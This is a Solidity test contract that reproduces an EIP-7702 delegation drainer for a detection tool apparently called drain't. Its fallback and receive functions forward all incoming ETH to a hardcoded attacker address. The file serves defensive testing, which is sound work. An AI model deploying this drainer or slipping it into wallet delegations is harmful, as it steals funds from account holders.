// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

/// @notice Reproduction of a canonical CrimeEnjoyor-class delegation drainer.
/// @dev Used as the target in drain't's attack simulation tests. NOT for
///      production use. Based on Wintermute's CrimeEnjoyor research:
///      https://x.com/wintermute_t/status/1932101433916305743
///
/// Properties (canonical drainer signature):
///   - Tiny runtime bytecode (< 200 bytes)
///   - No public function selectors
///   - Only fallback + receive (atypical for legitimate dApps)
///   - Auto-forward all incoming assets to a hardcoded attacker address
///
/// When set as a delegation target via EIP-7702, the victim's EOA gains
/// this code, and any incoming ETH gets routed to the attacker in the same
/// block. drain't's classifier should flag this with severity = "critical".
contract CrimeEnjoyorMock {
    /// Hardcoded sink address. Real-world variants randomize this per
    /// deploy or use `tx.origin` to drain to the caller of the auth tx.
    address payable public immutable attacker;

    constructor(address payable _attacker) {
        attacker = _attacker;
    }

    /// Drain ETH on any unknown call (including delegated execution).
    fallback() external payable {
        uint256 bal = address(this).balance;
        if (bal > 0) {
            attacker.transfer(bal);
        }
    }

    /// Drain plain ETH transfers (e.g., gas-funding step from sweeper bots).
    receive() external payable {
        attacker.transfer(msg.value);
    }
}
